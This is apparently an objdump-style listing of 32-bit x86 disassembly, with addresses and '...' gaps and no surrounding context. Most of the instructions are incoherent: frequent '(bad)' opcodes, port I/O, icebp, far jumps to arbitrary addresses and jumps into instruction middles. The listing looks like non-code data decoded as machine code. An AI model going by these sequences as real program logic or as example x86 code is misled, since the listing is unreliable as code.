  420949:	add    al,0x6b
  42094b:	je     0x420934
  42094d:	sub    ebx,DWORD PTR [esi+0x6c]
  420950:	rcr    DWORD PTR [eax+0x0],cl
  420953:	add    bh,dl
  420955:	pop    eax
  420956:	add    BYTE PTR [eax],al
  420958:	xlat   BYTE PTR ds:[ebx]
  420959:	pop    eax
  42095a:	ds add bl,ch
  42095d:	outs   dx,DWORD PTR ds:[esi]
  42095e:	add    BYTE PTR [eax+eax*1],bh
	...
  420989:	add    bh,dh
  42098b:	iret   
  42098c:	dec    esp
  42098d:	xor    ebp,eax
  42098f:	sub    BYTE PTR [esi+0x73],bl
  420992:	test   BYTE PTR [edi],al
  420994:	ins    BYTE PTR es:[edi],dx
  420995:	jb     0x42091a
  420997:	dec    edx
  420998:	add    BYTE PTR [esp+esi*4],bh
  42099b:	int    0x50
  42099d:	push   eax
  42099e:	test   al,0x28
  4209a0:	pop    esi
  4209a1:	jae    0x420967
  4209a3:	pop    es
  4209a4:	ins    BYTE PTR es:[edi],dx
  4209a5:	jb     0x42092a
  4209a7:	dec    edx
  4209a8:	add    BYTE PTR [esi+ebp*4],bh
  4209ab:	int    0x3d
  4209ad:	push   eax
  4209ae:	test   al,0x28
  4209b0:	pop    esi
  4209b1:	jae    0x420977
  4209b3:	pop    es
  4209b4:	ins    BYTE PTR es:[edi],dx
  4209b5:	jb     0x42097a
  4209b7:	dec    edx
  4209b8:	add    BYTE PTR [edi+ecx*4],bh
  4209bb:	and    al,0x51
  4209bd:	push   eax
  4209be:	call   0x5e28:0xa86c65f9
  4209c5:	jae    0x42097b
  4209c7:	pop    es
  4209c8:	ins    BYTE PTR es:[edi],dx
  4209c9:	jb     0x42094e
  4209cb:	inc    ebp
  4209cc:	add    BYTE PTR [eax],al
  4209ce:	imul   edx,edx,0x65
  4209d1:	arpl   WORD PTR [esi],di
  4209d3:	mov    al,0xd9
  4209d5:	jo     0x420980
  4209d7:	xchg   esp,eax
  4209d8:	lock pop ebx
  4209da:	imul   ebp,DWORD PTR [ebx+0x459963da],0x9b721ff5
  4209e4:	repnz bound ebx,QWORD PTR [esi]
  4209e7:	outs   dx,DWORD PTR ds:[esi]
  4209e8:	jecxz  0x420a50
  4209ea:	bound  eax,QWORD PTR [edx]
  4209ec:	(bad)  
  4209ed:	ins    BYTE PTR es:[edi],dx
	...
  420a16:	add    BYTE PTR [eax],al
  420a18:	pusha  
  420a19:	data16 icebp 
  420a1b:	pop    esi
  420a1c:	ins    BYTE PTR es:[edi],dx
  420a1d:	pop    edi
  420a1e:	enter  0x674a,0x61
  420a22:	imul   BYTE PTR [ebp+ecx*2+0x65]
  420a26:	loop   0x420a9b
  420a28:	push   0x65
  420a2a:	fld    TBYTE PTR [ebp+0x5a]
  420a2d:	push   ebp
  420a2e:	icebp  
  420a2f:	jo     0x420a8f
  420a31:	outs   dx,BYTE PTR ds:[esi]
  420a32:	(bad)  [ebp+0x1b]
  420a35:	bound  esi,QWORD PTR [edi+0x11e175e]
  420a3b:	pop    esp
  420a3c:	repz sbb ah,dh
  420a3f:	jno    0x420a6a
  420a41:	xor    edx,ebx
  420a43:	or     dh,BYTE PTR gs:[esi+0x161866d1]
  420a4a:	fidiv  DWORD PTR [ebp+ecx*1+0x62]
  420a4e:	mov    bh,0x5e
  420a50:	out    0xcd,eax
  420a52:	add    BYTE PTR [ecx-0x1f],dl
  420a55:	fucomi st,st(4)
  420a57:	je     0x420a38
  420a59:	out    dx,eax
  420a5a:	fistp  WORD PTR [ebx-0xd]
  420a5d:	(bad)  
  420a5f:	jno    0x420a4a
  420a61:	lock fldenv [ebp-0x36]
  420a65:	mov    ch,0xd1
  420a67:	data16 fcom st(5)
  420a6a:	fnstenv [ebp+ecx*8+0x21]
  420a6e:	mov    eax,0x188a75e
  420a73:	push   ecx
  420a74:	mov    eax,ds:0xb2f04d5b
  420a79:	jl     0x420ad4
  420a7b:	loope  0x420a7d
	...
  420aa5:	add    BYTE PTR [ebp+0x58d940ad],al
  420aab:	lea    edx,[ebx-0x9]
  420aae:	jne    0x420a4d
  420ab0:	stc    
  420ab1:	(bad)  
  420ab2:	outs   dx,BYTE PTR ds:[esi]
  420ab3:	xor    BYTE PTR [ebx],0xf0
  420ab6:	cwde   
  420ab7:	jns    0x420b07
  420ab9:	idiv   ecx
  420abb:	sahf   
  420abc:	dec    eax
  420abd:	lock nop
  420abf:	lahf   
  420ac0:	adc    dh,dh
  420ac2:	jmp    0x81321365
  420ac7:	lahf   
  420ac8:	add    dh,dh
  420aca:	jg     0x420b48
  420acc:	add    al,BYTE PTR [eax*4+0x5fd8107c]
  420ad3:	jp     0x420ad4
  420ad5:	sbb    DWORD PTR [ecx+0x79],ebx
  420ad8:	add    BYTE PTR [edi+ecx*1],al
  420adb:	jp     0x420ae2
  420add:	lock sub bh,BYTE PTR [ecx+ebx*8-0x20]
  420ae2:	add    eax,0x12e6ceab
  420ae7:	cmp    edi,DWORD PTR [edx-0x3b70f114]
  420aed:	fmul   DWORD PTR [esi]
  420aef:	cmp    esi,DWORD PTR [eax-0x68a4e127]
  420af5:	in     al,0xd
  420af7:	jae    0x420ae0
  420af9:	(bad)  
  420afa:	or     DWORD PTR [edx-0x36],edi
  420afd:	fimul  DWORD PTR [esi]
  420aff:	test   BYTE PTR [edx-0x32882311],bl
  420b05:	(bad)  
  420b07:	jae    0x420af0
  420b09:	rol    DWORD PTR [eax],cl
	...
  420b33:	add    bh,cl
  420b35:	jns    0x420abd
  420b37:	cmc    
  420b38:	lock ja 0x420b22
  420b3b:	mov    edi,0xd3888ee8
  420b40:	loopne 0x420ad0
  420b42:	add    BYTE PTR [ecx-0x759e55c3],al
  420b48:	adc    al,0x8d
  420b4a:	outs   dx,BYTE PTR ds:[esi]
  420b4b:	pop    ebp
  420b4c:	xor    edi,DWORD PTR [eax]
  420b4e:	addr16 dec edi
  420b50:	add    eax,0xf739590a
  420b55:	jp     0x420bc4
  420b57:	cmp    al,0x1d
  420b59:	sub    DWORD PTR [ecx+ebp*8-0xe],0xf356676
  420b61:	test   eax,0xa1064c72
  420b66:	outs   dx,BYTE PTR ds:[esi]
  420b67:	dec    edx
  420b68:	call   0xb1526fe9
  420b6d:	test   al,0x67
  420b6f:	or     eax,0x86b9e3a
  420b74:	cmc    
  420b75:	jne    0x420bb6
  420b77:	add    eax,0xfa638bde
  420b7c:	ror    BYTE PTR [ecx],cl
  420b7e:	push   ecx
  420b7f:	add    al,0xdb
  420b81:	sub    DWORD PTR [esi+0x6],0xf0657696
  420b88:	cmp    eax,0x92d96dab
  420b8d:	jl     0x420c01
  420b8f:	xlat   BYTE PTR ds:[ebx]
  420b90:	or     BYTE PTR [ebx+0x7976b900],0x50
  420b97:	mov    esi,0x0
	...
  420bc0:	add    BYTE PTR [eax],al
  420bc2:	mov    ecx,DWORD PTR [ebp+0x79669900]
  420bc8:	aas    
  420bc9:	retf   0x769a
  420bcc:	jae    0x420b95
  420bce:	imul   ecx,DWORD PTR [ecx],0x996dbe4d
  420bd4:	pop    edi
  420bd5:	call   0x981:0x9b6d8e72
  420bdc:	push   edx
  420bdd:	test   BYTE PTR [ecx+0x79],ch
  420be0:	push   ecx
  420be1:	test   BYTE PTR [ebx-0x71],cl
  420be4:	arpl   WORD PTR [eax],ax
  420be6:	lds    ebx,FWORD PTR [ebp+0x4f]
  420be9:	ins    DWORD PTR es:[edi],dx
  420bea:	retf   
  420beb:	or     eax,0xf8b56f4d
  420bf0:	cld    
  420bf1:	push   edx
  420bf2:	mov    dl,0xf8
  420bf4:	ins    BYTE PTR es:[edi],dx
  420bf5:	inc    ecx
  420bf6:	je     0x420bf6
  420bf8:	imul   esi,DWORD PTR [ebp+0x71],0xb
  420bfc:	std    
  420bfd:	push   edx
  420bfe:	or     BYTE PTR [ebx],0x6d
  420c01:	push   eax
  420c02:	xchg   BYTE PTR [esi],cl
  420c04:	jo     0x420c7d
  420c06:	jo     0x420c19
  420c08:	popa   
  420c09:	add    BYTE PTR [esi-0x2],dh
  420c0c:	pop    edi
  420c0d:	outs   dx,DWORD PTR ds:[esi]
  420c0e:	cmp    ah,BYTE PTR ds:0xfd842e71
  420c14:	arpl   WORD PTR [eax],ax
  420c16:	ss (bad) 
  420c18:	pop    edi
  420c19:	outs   dx,DWORD PTR ds:[esi]
  420c1a:	dec    edx
  420c1b:	and    eax,0xfd442e71
  420c20:	push   0x0
  420c22:	and    esp,DWORD PTR [ecx]
  420c24:	pop    esi
  420c25:	je     0x420c27
	...
  420c4f:	add    BYTE PTR [edx],dl
  420c51:	cld    
  420c52:	gs ins BYTE PTR es:[edi],dx
  420c54:	xlat   BYTE PTR ds:[ebx]
  420c55:	and    BYTE PTR [ecx+0x68],dl
  420c58:	dec    edx
  420c59:	aas    
  420c5a:	inc    edx
  420c5b:	popa   
  420c5c:	stos   DWORD PTR es:[edi],eax
  420c5d:	cmp    eax,0xfa905300
  420c62:	jo     0x420cdb
  420c64:	jbe    0x420c74
  420c66:	bound  ebx,QWORD PTR [ebp+edx*8-0x3b]
  420c6a:	push   eax
  420c6b:	pop    esp
  420c6c:	retf   
  420c6d:	and    al,0x62
  420c6f:	and    ch,dl
  420c71:	std    
  420c72:	jo     0x420c95
  420c74:	xchg   edi,eax
  420c75:	das    
  420c76:	ins    BYTE PTR es:[edi],dx
  420c77:	mov    bx,0x5e0b
  420c7b:	jb     0x420cf7
  420c7d:	and    BYTE PTR [edi+0x49],cl
  420c80:	stos   DWORD PTR es:[edi],eax
  420c81:	and    BYTE PTR [ecx+0x68],dl
  420c84:	mov    edx,0x3e61423c
  420c89:	out    0x21,al
  420c8b:	pop    esp
  420c8c:	jmp    0x420c72
  420c8e:	fnsave [ecx-0x33]
  420c91:	adc    ebp,ebx
  420c93:	(bad)  
  420c94:	into   
  420c95:	fsubr  st,st(4)
  420c97:	call   DWORD PTR [eax-0x58970d1f]
  420c9d:	mov    al,ah
  420c9f:	pop    ds
  420ca0:	sub    BYTE PTR [ebx-0x51629d0e],0xd5
  420ca7:	jno    0x420c40
  420ca9:	repnz shl BYTE PTR [ecx-0x5f],1
  420cad:	mov    eax,ds:0x369b5ef2
  420cb2:	(bad)  [ecx+0x0]
	...
  420cdd:	add    BYTE PTR [esi],bh
  420cdf:	xor    eax,0x466872d5
  420ce4:	add    al,0x44
  420ce6:	pop    ebx
  420ce7:	mov    al,ds:0x665a72e3
  420cec:	add    al,0x44
  420cee:	push   edi
  420cef:	fs and al,0x21
  420cf2:	and    edx,DWORD PTR [esi+0x4]
  420cf5:	push   ecx
  420cf6:	or     DWORD PTR [esi-0x2c],0x1f
  420cfa:	sub    DWORD PTR [edi-0x1d],0x66
  420cfe:	push   edx
  420cff:	adc    al,ah
  420d01:	arpl   WORD PTR [edx],sp
  420d03:	add    al,0xe0
  420d05:	jo     0x420d34
  420d07:	repnz ror DWORD PTR [edx+0x12],1
  420d0b:	ret    0x5120
  420d0e:	sbb    esp,DWORD PTR [ebx+ebp*8]
  420d11:	bound  ecx,QWORD PTR [edx+esi*8]
  420d14:	ror    BYTE PTR [esi+ebp*8+0x64],1
  420d18:	and    al,0x51
  420d1a:	and    eax,esp
  420d1c:	jmp    0xe4c:0xd0f20c62
  420d23:	add    eax,0x1eed5321
  420d28:	out    dx,eax
  420d29:	pop    ds
  420d2a:	clc    
  420d2b:	pop    edx
  420d2c:	mov    al,bl
  420d2e:	fcomp  QWORD PTR [edx-0x46]
  420d31:	mov    eax,0xd0c7aaed
  420d36:	into   
  420d37:	jge    0x420cd2
  420d39:	and    edi,eax
  420d3b:	jns    0x420cd1
  420d3d:	loopne 0x420d80
  420d3f:	xchg   ebp,eax
  420d40:	lods   eax,DWORD PTR ds:[esi]
  420d41:	iret   
	...
  420d6a:	add    BYTE PTR [eax],al
  420d6c:	mov    DWORD PTR [ebx],edi
  420d6e:	lods   al,BYTE PTR ds:[esi]
  420d6f:	fcom   DWORD PTR [eax+0x69237b74]
  420d75:	jg     0x420dc2
  420d77:	repnz pushf 
  420d79:	mov    bl,BYTE PTR [edx+0x4]
  420d7c:	mov    BYTE PTR [ebp-0x4fce2bc5],dl
  420d82:	pop    edx
  420d83:	loope  0x420d14
  420d85:	cmp    esi,DWORD PTR ds:0xe78094e5
  420d8b:	mov    ch,0x8b
  420d8d:	scas   eax,DWORD PTR es:[edi]
  420d8e:	pop    ss
  420d8f:	and    al,0x8f
  420d91:	cmp    BYTE PTR [ecx],0xee
  420d94:	pop    esp
  420d95:	mov    edi,esp
  420d97:	mov    esp,0x24379c74
  420d9c:	outs   dx,DWORD PTR ds:[esi]
  420d9d:	sbb    BYTE PTR [ecx],0xee
  420da0:	pop    esp
  420da1:	mov    edi,esp
  420da3:	mov    esp,0x24179c74
  420da8:	ins    DWORD PTR es:[edi],dx
  420da9:	mov    al,BYTE PTR [edx+esi*8]
  420dac:	pop    ecx
  420dad:	xchg   ebp,eax
  420dae:	or     cl,bl
  420db0:	sbb    al,0x5b
  420db2:	and    al,0xd9
  420db4:	or     BYTE PTR [ebx+edx*8+0x3],dh
  420db8:	imul   BYTE PTR [esi-0x4fc62c4d]
  420dbe:	(bad)  
  420dc0:	cvtdq2ps xmm3,XMMWORD PTR [edi+0x7aaedcf]
  420dc7:	rcr    DWORD PTR [ecx+ecx*4],cl
  420dca:	mov    ch,0xe0
  420dcc:	out    dx,eax
  420dcd:	cmp    al,BYTE PTR [eax]
  420dcf:	pushf  
	...
  420df8:	add    BYTE PTR [eax],al
  420dfa:	(bad)  
  420dfb:	xchg   edx,eax
  420dfc:	add    BYTE PTR [ecx-0x36ce6950],bl
  420e02:	mov    cs,WORD PTR [ebx-0x61c2649d]
  420e08:	dec    ebx
  420e09:	test   al,0x6d
  420e0b:	push   bx
  420e0d:	call   0xaa71:0xb1008c5e
  420e14:	push   eax
  420e15:	lods   al,BYTE PTR ds:[esi]
  420e16:	and    bh,BYTE PTR [ebp+0x6c]
  420e19:	leave  
  420e1a:	push   cs
  420e1b:	mov    esp,DWORD PTR [ebx+0x7b]
  420e1e:	pop    ebp
  420e1f:	xchg   ebp,eax
  420e20:	pop    edi
  420e21:	push   esp
  420e22:	add    DWORD PTR [esi],eax
  420e24:	inc    ebp
  420e25:	xor    eax,0x484b95ee
  420e2a:	cmc    
  420e2b:	jno    0x420e4d
  420e2d:	cmp    ch,cl
  420e2f:	mov    esi,DWORD PTR [esi+0x4c]
  420e32:	or     al,0x6
  420e34:	push   edx
  420e35:	sub    al,0xe
  420e37:	xchg   esi,eax
  420e38:	and    BYTE PTR [edi+ebp*8],bl
  420e3b:	js     0x420eaf
  420e3d:	jmp    0x398fb97f
  420e42:	das    
  420e43:	cmp    edx,DWORD PTR [eax+0xe]
  420e46:	int3   
  420e47:	mov    DWORD PTR [eax],eax
  420e49:	cmp    cl,BYTE PTR [ecx-0x1236af57]
  420e4f:	jbe    0x420ec3
  420e51:	std    
  420e52:	cmp    eax,0x92284b9e
  420e57:	gs push eax
  420e59:	push   es
  420e5a:	lods   al,BYTE PTR ds:[esi]
  420e5b:	mov    DWORD PTR [eax],eax
  420e5d:	jmp    0x420e62
	...
  420e86:	add    BYTE PTR [eax],al
  420e88:	lea    edx,[esi-0x54a5e5b0]
  420e8e:	pop    edi
  420e8f:	fimul  DWORD PTR [esi+0x71db6d8e]
  420e95:	dec    ebx
  420e96:	add    BYTE PTR [eax+0x5044d0],ah
  420e9c:	aaa    
  420e9d:	das    
  420e9e:	pop    esi
  420e9f:	jae    0x420e55
  420ea1:	imul   BYTE PTR [ebx+0x72]
  420ea4:	or     DWORD PTR [ebx+0x0],0x4e
  420ea8:	leave  
  420ea9:	adc    eax,0xf8a7204d
  420eae:	outs   dx,DWORD PTR ds:[esi]
  420eaf:	jae    0x420e61
  420eb1:	outs   dx,DWORD PTR cs:[esi]
  420eb3:	fs jne 0x420f0f
  420eb6:	dec    eax
  420eb7:	push   esp
  420eb8:	xchg   ebx,eax
  420eb9:	sub    DWORD PTR [edx+0x61],ecx
  420ebc:	scas   al,BYTE PTR es:[edi]
  420ebd:	sub    eax,0xbc6501d
  420ec2:	jo     0x420f3b
  420ec4:	mov    eax,0x1732610a
  420ec9:	sub    al,0x4a
  420ecb:	push   esp
  420ecc:	addr16 aas 
  420ece:	push   eax
  420ecf:	popa   
  420ed0:	je     0x420edc
  420ed2:	je     0x420f43
  420ed4:	jne    0x420ed1
  420ed6:	add    BYTE PTR cs:[edi],dl
  420ed9:	sub    DWORD PTR [eax+edx*2+0x4],ecx
  420edd:	cmp    DWORD PTR [eax+0x61],edx
  420ee0:	xor    al,0xa
  420ee2:	je     0x420f53
  420ee4:	xor    eax,0x4a48fcfb
  420ee9:	sbb    BYTE PTR [ebp+0x20],cl
	...
  420f14:	add    BYTE PTR [eax],al
  420f16:	daa    
  420f17:	clc    
  420f18:	outs   dx,DWORD PTR ds:[esi]
  420f19:	jae    0x420f4b
  420f1b:	outs   dx,DWORD PTR cs:[esi]
  420f1d:	fs out 0xce,eax
  420f20:	dec    edx
  420f21:	push   esp
  420f22:	pop    es
  420f23:	aas    
  420f24:	push   eax
  420f25:	popa   
  420f26:	les    ecx,FWORD PTR [ebx]
  420f28:	je     0x420f99
  420f2a:	mov    ch,0x24
  420f2c:	std    
  420f2d:	inc    edi
  420f2e:	push   ebx
  420f2f:	sub    ecx,DWORD PTR [ebp+0x20]
  420f32:	inc    edi
  420f33:	clc    
  420f34:	outs   dx,DWORD PTR ds:[esi]
  420f35:	jae    0x420eb7
  420f37:	das    
  420f38:	outs   dx,DWORD PTR ds:[esi]
  420f39:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  420f3b:	sub    ecx,DWORD PTR [edx+0x54]
  420f3e:	ds ret 0x5020
  420f42:	pop    ds
  420f43:	and    eax,esi
  420f45:	je     0x420f58
  420f47:	rcr    ah,0xff
  420f4a:	jns    0x420f2d
  420f4c:	shl    DWORD PTR [ebp-0x16],cl
  420f4f:	vpavgw xmm2,xmm1,xmm5
  420f54:	mov    ch,0x66
  420f56:	fstp   st(7)
  420f58:	shl    DWORD PTR [eax-0x17],cl
  420f5b:	fucomi st,st(4)
  420f5d:	pop    ebx
  420f5e:	pop    es
  420f5f:	fsub   st(4),st
  420f61:	(bad)  
  420f62:	int3   
  420f63:	sbb    esi,0x73
  420f66:	push   ds
  420f67:	mov    bl,0xdf
  420f69:	pusha  
  420f6a:	test   eax,0x5e73d38f
  420f6f:	mov    edi,0xdd9f6de1
  420f74:	fnsave [ecx-0x7e]
  420f77:	xor    esp,ebp
  420f79:	pusha  
	...
  420fa2:	add    BYTE PTR [eax],al
  420fa4:	test   eax,0x8d73f2af
  420fa9:	repnz retf 
  420fab:	arpl   WORD PTR [ebx-0x759927bc],sp
  420fb1:	stos   DWORD PTR es:[edi],eax
  420fb2:	out    0x70,eax
  420fb4:	ds popa 
  420fb6:	icebp  
  420fb7:	gs push 0x45
  420fba:	jecxz  0x42102d
  420fbc:	arpl   WORD PTR [esi-0x31],dx
  420fbf:	pop    bp
  420fc1:	pusha  
  420fc2:	icebp  
  420fc3:	jo     0x42102e
  420fc5:	pop    esp
  420fc6:	fcomp  DWORD PTR [ebx-0x7f]
  420fc9:	push   esp
  420fca:	jmp    0x4b4c:0xc05f5d66
  420fd1:	push   es
  420fd2:	in     eax,dx
  420fd3:	ins    BYTE PTR es:[edi],dx
  420fd4:	sub    DWORD PTR [ecx-0x40],ebp
  420fd7:	dec    esp
  420fd8:	add    edi,DWORD PTR [ebx]
  420fda:	and    al,0x3f
  420fdc:	sbb    eax,0x1072f151
  420fe1:	pop    ebx
  420fe2:	(bad)  [ebx]
  420fe4:	add    eax,0x1ae4cd7a
  420fe9:	jle    0x420fc4
  420feb:	mov    edi,0xf2ca7848
  420ff0:	or     al,0x75
  420ff2:	mov    ebx,0xcea879d6
  420ff7:	jmp    0xd60a9be9
  420ffc:	fsub   QWORD PTR [esi-0x77211364]
  421002:	xchg   esi,eax
  421003:	(bad)  
  421004:	jmp    0x0:0xbf937c
	...
  42102f:	add    BYTE PTR [eax],al
  421031:	add    dl,ch
  421033:	jno    0x420fba
  421035:	out    0xda,eax
  421037:	mov    ebx,DWORD PTR [edx-0x5c510fdd]
  42103d:	(bad)  
  42103e:	lods   al,BYTE PTR ds:[esi]
  42103f:	lea    edi,[ecx-0x18]
  421042:	mov    ds:0xafe89d87,eax
  421047:	mov    es,WORD PTR [eax+0x3e9f93f2]
  42104d:	in     eax,dx
  42104e:	stos   DWORD PTR es:[edi],eax
  42104f:	ja     0x42109f
  421051:	fisttp DWORD PTR [esi-0x7116dbc5]
  421057:	mov    cs,WORD PTR [eax-0x15]
  42105a:	cwde   
  42105b:	jno    0x4210ab
  42105d:	and    al,0x8f
  42105f:	mov    BYTE PTR [ecx-0x29],cl
  421062:	push   0x54e93b8e
  421067:	lahf   
  421068:	pop    ss
  421069:	(bad)  
  42106a:	push   edx
  42106b:	jns    0x42107d
  42106d:	lock pop esp
  42106f:	mov    ?,WORD PTR [ebx]
  421071:	rcr    DWORD PTR [eax+0x7e],1
  421074:	sbb    ebx,esi
  421076:	dec    esi
  421077:	jb     0x42107e
  421079:	fsub   DWORD PTR [ecx]
  42107b:	xchg   edx,eax
  42107c:	cld    
  42107d:	xlat   BYTE PTR ds:[ebx]
  42107e:	and    eax,0x51ef0e72
  421083:	xchg   esp,eax
  421084:	add    BYTE PTR [edi],al
  421086:	xchg   BYTE PTR [ebp+0x72],bh
  421089:	call   DWORD PTR [esi-0x5945df72]
  42108f:	mov    ?,WORD PTR [eax+edx*8-0x71]
  421093:	ja     0x421106
  421095:	jmp    0x42109a
	...
  4210be:	add    BYTE PTR [eax],al
  4210c0:	shr    BYTE PTR [edi+0x66],1
  4210c3:	aad    0x64
  4210c5:	mov    eax,ds:0x95b9cc72
  4210ca:	addr16 retf 0x6f8b
  4210ce:	jno    0x421096
  4210d0:	push   edi
  4210d1:	mov    ds,WORD PTR [esi+edx*4+0x52]
  4210d5:	jo     0x42113b
  4210d7:	xchg   esi,eax
  4210d8:	je     0x421065
  4210da:	and    BYTE PTR [edi-0x63be5977],ch
  4210e0:	jae    0x42106e
  4210e2:	arpl   WORD PTR [edi+0x69],di
  4210e5:	test   al,0x63
  4210e7:	jnp    0x4210f9
  4210e9:	jns    0x421158
  4210eb:	(bad)  
  4210ec:	icebp  
  4210ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210ee:	xchg   DWORD PTR [bx+di],esp
  4210f1:	outs   dx,DWORD PTR ds:[esi]
  4210f2:	jne    0x42116e
  4210f4:	pop    ebp
  4210f5:	xchg   esi,eax
  4210f6:	arpl   WORD PTR [edx-0xd],bx
  4210f9:	mov    al,ds:0x770c5065
  4210fe:	and    BYTE PTR [edx],bh
  421100:	icebp  
  421101:	jnp    0x421174
  421103:	push   eax
  421104:	jmp    0x421093
  421106:	arpl   WORD PTR [esi+edi*8-0x6f],dx
  42110a:	jb     0x42115a
  42110c:	in     al,0x78
  42110e:	ins    BYTE PTR es:[edi],dx
  42110f:	dec    esp
  421110:	adc    esp,DWORD PTR [esi+0x7606344d]
  421116:	ins    DWORD PTR es:[edi],dx
  421117:	push   ss
  421118:	jmp    0x42111b
  42111a:	push   edx
  42111b:	push   cs
  42111c:	in     al,0x8d
  42111e:	jne    0x421128
  421120:	lock jl 0x42117f
  421123:	sbb    al,0x0
	...
  42114d:	add    ch,dl
  42114f:	jp     0x4211c3
  421151:	add    BYTE PTR [eax+0x28],dl
  421154:	ins    BYTE PTR es:[edi],dx
  421155:	stos   WORD PTR es:[edi],ax
  421157:	rol    DWORD PTR [ebp+0x6e],0xab
  42115b:	clc    
  42115c:	outs   dx,BYTE PTR ds:[esi]
  42115d:	outs   dx,BYTE PTR ds:[esi]
  42115e:	cmp    ah,BYTE PTR [ebx]
  421160:	sbb    eax,0x6bf68441
  421165:	jne    0x4210e8
  421167:	sub    DWORD PTR ds:0x5e0b764d,ebx
  42116d:	addr16 jp 0x421197
  421170:	std    
  421171:	dec    esi
  421172:	mov    edx,0x806f6929
  421177:	out    dx,al
  421178:	cld    
  421179:	pop    ebx
  42117a:	xchg   esi,eax
  42117b:	neg    BYTE PTR [edi+0x6f]
  42117e:	stos   BYTE PTR es:[edi],al
  42117f:	or     esi,DWORD PTR [ecx+0x73]
  421182:	addr16 hlt 
  421184:	pusha  
  421185:	shr    DWORD PTR gs:[ecx],0x66
  421189:	mov    si,0x5df6
  42118d:	je     0x42114d
  42118f:	or     ch,BYTE PTR [ebx+0x0]
  421192:	into   
  421193:	clc    
  421194:	popa   
  421195:	outs   dx,BYTE PTR ds:[esi]
  421196:	stos   DWORD PTR es:[edi],eax
  421197:	cmc    
  421198:	jo     0x421213
  42119a:	ret    0x6ef3
  42119d:	add    BYTE PTR [esi-0x7b8b9df6],bh
  4211a3:	or     ch,BYTE PTR [edx+0x6d]
  4211a6:	inc    edi
  4211a7:	bound  esi,QWORD PTR es:[edx+0x69]
  4211ab:	clc    
  4211ac:	outs   dx,BYTE PTR ds:[esi]
  4211ad:	and    BYTE PTR [edi-0x4],ah
  4211b0:	outs   dx,DWORD PTR ds:[esi]
  4211b1:	jae    0x4211b3
	...
  4211db:	add    BYTE PTR [eax],bh
  4211dd:	or     ch,BYTE PTR [edi+0x64]
  4211e0:	xor    al,0x57
  4211e2:	imul   esi,DWORD PTR [ebp+0x2b],0xb
  4211e6:	ins    BYTE PTR es:[edi],dx
  4211e7:	outs   dx,DWORD PTR ds:[esi]
  4211e8:	jl     0x421221
  4211ea:	pop    ebp
  4211eb:	arpl   WORD PTR [edx+ecx*1+0x72],ax
  4211ef:	outs   dx,BYTE PTR ds:[esi]
  4211f0:	sub    esi,DWORD PTR [edi]
  4211f2:	imul   esp,DWORD PTR [ecx+0x3e],0x5b64e158
  4211f9:	fs and al,0x70
  4211fc:	pop    ds
  4211fd:	add    eax,0x42174d4
  421202:	in     eax,0x70
  421204:	ds pop ebx
  421206:	call   0xea48226d
  42120b:	jae    0x421234
  42120d:	paddq  mm7,mm7
  421210:	adc    al,0x57
  421212:	adc    al,0x38
  421214:	out    0x56,al
  421216:	and    eax,0x2dca4a30
  42121b:	and    ebp,DWORD PTR [esi]
  42121d:	(bad)  
  42121e:	mov    eax,0x13021b2a
  421223:	pop    eax
  421224:	and    eax,DWORD PTR [edx]
  421226:	adc    ebx,DWORD PTR [eax+0x13]
  421229:	push   edi
  42122a:	adc    al,0x32
  42122c:	test   BYTE PTR [esi],0x11
  42122f:	xor    dh,dh
  421231:	push   ss
  421232:	adc    DWORD PTR [edx],esi
  421234:	out    0xe,al
  421236:	adc    DWORD PTR [edx],esi
  421238:	out    0x16,al
  42123a:	adc    DWORD PTR [edx],esi
  42123c:	xchg   esi,eax
  42123d:	movups XMMWORD PTR [edx],xmm6
	...
  421268:	add    BYTE PTR [eax],al
  42126a:	xchg   esi,eax
  42126b:	jg     0x42126e
  42126d:	push   esp
  42126e:	xchg   esi,eax
  42126f:	jg     0x421260
  421271:	arpl   WORD PTR [ebx-0x73991c7c],bx
  421277:	mov    es,WORD PTR [esp+ebx*2]
  42127a:	push   0xffffffaa
  42127c:	xlat   BYTE PTR ds:[ebx]
  42127d:	ins    DWORD PTR es:[edi],dx
  42127e:	mov    ds:0x9761d28f,al
  421283:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421284:	call   0xc4704e88
  421289:	dec    DWORD PTR [ebx]
  42128b:	dec    edx
  42128c:	(bad)  
  42128d:	dec    edi
  42128f:	cmp    eax,esp
  421291:	push   DWORD PTR [ebp+0x3dffc45f]
  421297:	pop    ebx
  421298:	cmp    esp,eax
  42129a:	shr    DWORD PTR ds:0x53c9c433,1
  4212a0:	xor    ah,al
  4212a2:	rcr    DWORD PTR [edx+0x31],0xc4
  4212a6:	mov    ecx,0xb1c42254
  4212ab:	rcr    DWORD PTR [edx],1
  4212ad:	les    ebp,FWORD PTR [ecx-0x5e3beb6a]
  4212b3:	ror    DWORD PTR ds:0xc94e99c4,cl
  4212b9:	ret    
  4212ba:	xchg   ecx,eax
  4212bb:	loopne 0x42127f
  4212bd:	ret    
  4212be:	mov    DWORD PTR [ebp-0x57e3c32],esp
  4212c4:	(bad)
  4212c7:	arpl   di,cx
  4212c9:	ret    
  4212ca:	jno    0x4212b1
  4212cc:	into   
  4212cd:	ret    
	...
  4212f6:	add    BYTE PTR [eax],al
  4212f8:	imul   esp,DWORD PTR [ecx-0x40],0xc25e61c3
  4212ff:	ret    
  421300:	pop    ecx
  421301:	lea    edx,[edx-0x7340ae3d]
  421307:	ret    
  421308:	dec    ecx
  421309:	out    0x97,eax
  42130b:	ret    
  42130c:	inc    ecx
  42130d:	sbb    al,0x9a
  42130f:	ret    
  421310:	cmp    DWORD PTR [esi-0x2ece3c86],edi
  421316:	jae    0x4212db
  421318:	sub    eax,edx
  42131a:	jl     0x4212df
  42131c:	and    esp,eax
  42131e:	outs   dx,BYTE PTR ds:[esi]
  42131f:	ret    
  421320:	sbb    DWORD PTR [ebp-0x45ee3b9d],esp
  421326:	pop    edx
  421327:	les    ecx,FWORD PTR [ecx]
  421329:	push   edx
  42132a:	push   esp
  42132b:	les    eax,FWORD PTR [ecx]
  42132d:	mov    eax,ds:0xb5f9c44e
  421332:	inc    ebp
  421333:	(bad)  
  421334:	icebp  
  421335:	jg     0x4213a8
  421337:	ret    
  421338:	jmp    0xfda61310
  42133d:	(bad)  
  42133e:	push   edi
  42133f:	pop    edi
  421340:	std    
  421341:	(bad)  
  421342:	jp     0x4212c6
  421344:	std    
  421345:	inc    BYTE PTR [ebx]
  421347:	jge    0x421346
  421349:	(bad)  
  42134a:	mov    ecx,0x3efefd75
  42134f:	ins    BYTE PTR es:[edi],dx
  421350:	jge    0x421350
